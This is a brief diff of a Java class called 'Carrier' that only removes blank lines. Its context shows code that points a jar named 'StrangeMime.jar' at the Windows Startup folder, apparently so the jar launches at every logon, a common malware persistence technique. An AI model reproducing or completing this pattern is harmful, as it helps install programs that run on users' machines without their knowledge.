@@ -6,9 +6,7 @@ import java.io.IOException;
 /**
  * @author Mahadev Mane
  */
-
 public class Carrier {
-
     public static void main(String[] args) {
         String src = "StrangeMime.jar";
         String dest = "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
